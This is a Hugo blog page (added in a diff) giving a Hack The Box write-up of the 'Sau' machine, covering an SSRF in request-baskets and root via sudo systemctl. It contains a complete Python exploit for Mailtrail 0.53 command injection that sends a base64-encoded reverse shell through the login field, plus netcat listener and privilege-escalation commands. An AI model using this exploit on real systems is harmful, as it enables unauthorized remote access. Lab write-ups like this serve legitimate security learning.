@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>SAU | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="SAU">
+  <meta itemprop="description" content="Hello and welcome to my first writeup on Hack the box machines. We will be handling an easy machine named Sau. We will use real vulnerabilities that were discovered before and we will also make use of exploits that had been used before. Let’s begin.
+Enumaration First of all we are going to run a NMAP scan to scan for open ports.
+From the scan we can see that port 22 is open on which ssh runs. But since we have no credentials we would not be able to use this. We can then see that the port 80 has been filtered which would mean we cannot communicate with it from outside the network. Then port 55555 would definately catch our attention. From the report we can see that the port is accessible on our browser and it allows for the get option.">
+  <meta itemprop="datePublished" content="2023-12-31T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-12-31T00:00:00+00:00">
+  <meta itemprop="wordCount" content="711">
+  <meta itemprop="keywords" content="HackTheBox">
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="stylesheet" href="/custom.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">SAU</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumaration">Enumaration</a></li>
+    <li><a href="#request-baskets-ssrf">Request-baskets SSRF</a></li>
+    <li><a href="#exploiting-mailtrail">Exploiting Mailtrail</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><p>Hello and welcome to my first writeup on Hack the box machines. We will be handling an easy machine named Sau. We will use real vulnerabilities that were discovered before and we will also make use of exploits that had been used before. Let&rsquo;s begin.</p>
+<h2 id="enumaration">Enumaration</h2>
+<p>First of all we are going to run a NMAP scan to scan for open ports.</p>
+<p><img src="https://i.ibb.co/bFPd1Sv/nmap.png" alt="1"></p>
+<p><img src="https://i.ibb.co/Z23FwTJ/report.png" alt="2"></p>
+<p>From the scan we can see that port 22 is open on which ssh runs. But since we have no credentials we would not be able to use this. We can then see that the port 80 has been filtered which would mean we cannot communicate with it from outside the network. Then port 55555 would definately catch our attention. From the report we can see that the port is accessible on our browser and it allows for the get option.</p>
+<p>We can access this by <code>http://machine_ip:55555</code> which will lead us to a page with request baskets.</p>
+<h2 id="request-baskets-ssrf">Request-baskets SSRF</h2>
+<p>When we visit the page this is what we can see</p>
+<p><img src="https://i.ibb.co/CWbzyxx/55555.png" alt="3"></p>
+<p>This is basically a page which creates request-baskets. What is interesting is we have a service and a version running. We can look this up and we see that we have a lurking vulnerability which is <code>Server Side Request Forgery</code>. This vulnerability exists due to some improper validation in a path and would ideally be leveraged to connect to any HTTP server on the network.</p>
+<p>To exploit this we need to create a basket and change some of the configurations on the basket.</p>
+<p><img src="https://i.ibb.co/p43QH7R/configuration.png" alt="4"></p>
+<p>First we need to set an URL where the requests will be forwarded to. We can use localhost and set the port to port <code>80</code>.</p>
+<p>Secondly we need to set <code>insecure_tls</code> to true which will ideally bypass the certificate verification.
+Next, we need to set <code>proxy response</code> to true which will send response of the forwarded server back to our client.</p>
+<p>Lastly, setting <code>expand_path</code> set to true makes forward_url path expanded when original http request contains compound path.</p>
+<p>From here we only need to visit the URL so as to trigger this vulnerability.</p>
+<h2 id="exploiting-mailtrail">Exploiting Mailtrail</h2>
+<p>So when we visit the URL we can see a page that looks like this</p>
+<p><img src="https://i.ibb.co/bKqqHK3/mailtrail.png" alt="5"></p>
+<p>We do not see much but we get a service running and its version. We can then look for the vulnerabilities associated with the service and version running.</p>
+<p>We then can get a python exploit script which would exploit a command injection vulnerability. The exploit creates a reverse shell payload encoded in Base64 to bypass potential protections like WAF, IPS or IDS and delivers it to the target URL using a curl command
+The payload is then executed on the target system, establishing a reverse shell connection back to the attacker&rsquo;s specified IP and port</p>
+<p>The python script is as follows:</p>
+<pre><code>#!/bin/python3
+
+import sys
+import os
+import base64
+
+# Arguments to be passed
+YOUR_IP = sys.argv[1]  # &lt;your ip&gt;
+YOUR_PORT = sys.argv[2]  # &lt;your port&gt;
+TARGET_URL = sys.argv[3]  # &lt;target url&gt;
+
+print(&quot;\n[+]Started MailTrail version 0.53 Exploit&quot;)
+
+# Fail-safe for arguments
+if len(sys.argv) != 4:
+    print(&quot;Usage: python3 mailtrail.py &lt;your ip&gt; &lt;your port&gt; &lt;target url&gt;&quot;)
+    sys.exit(-1)
+
+
+# Exploit the vulnerbility
+def exploit(my_ip, my_port, target_url):
+# Defining python3 reverse shell payload
+    payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;{my_ip}&quot;,{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)\''
+# Encoding the payload with base64 encoding
+    encoded_payload = base64.b64encode(payload.encode()).decode()
+# curl command that is to be executed on our system to exploit mailtrail
+    command = f&quot;curl '{target_url}/login' --data 'username=;`echo+\&quot;{encoded_payload}\&quot;+|+base64+-d+|+sh`'&quot;
+# Executing it
+    os.system(command)
+
+
+print(&quot;\n[+]Exploiting MailTrail on {}&quot;.format(str(TARGET_URL)))
+try:
+    exploit(YOUR_IP, YOUR_PORT, TARGET_URL)
+    print(&quot;\n[+] Successfully Exploited&quot;)
+    print(&quot;\n[+] Check your Reverse Shell Listener&quot;)
+except:
+    print(&quot;\n[!] An Error has occured. Try again!&quot;)
+</code></pre>
+<p>First we need to run a netcat listener on our machine, <code>nc -lnvp port</code>.</p>
+<p>Next we need to execute the exploit example, <code>python3 exploit.py [ip] [port] [target_url]</code>.
+From here we need to check at our listener for any connections. And we should be connected as a user.</p>
+<p><img src="https://i.ibb.co/kD3nP6H/user.png" alt="6"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Next we should try to escalate our privileges to root. Well we can run <code>sudo -l</code> which would help us to know what commands we can run as <code>sudo</code>.</p>
+<p><img src="https://i.ibb.co/sv9GX12/privesc.png" alt="7"></p>
+<p>We see that we can run <code>systemctl status trail.sevice</code> as sudo. Then we can run <code>!sh</code> and press return.</p>
+<p><img src="https://i.ibb.co/Fz1H9zr/root.png" alt="8"></p>
+<p>We are root. We can then find our flags.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>HTB machines are awesome. Happy hacking</p>
+</div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/tags/hackthebox/">HackTheBox</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=%2f%2flocalhost%3a1313%2fposts%2fhtb%2fsau%2f&amp;text=SAU" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=%2f%2flocalhost%3a1313%2fposts%2fhtb%2fsau%2f&title=SAU" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
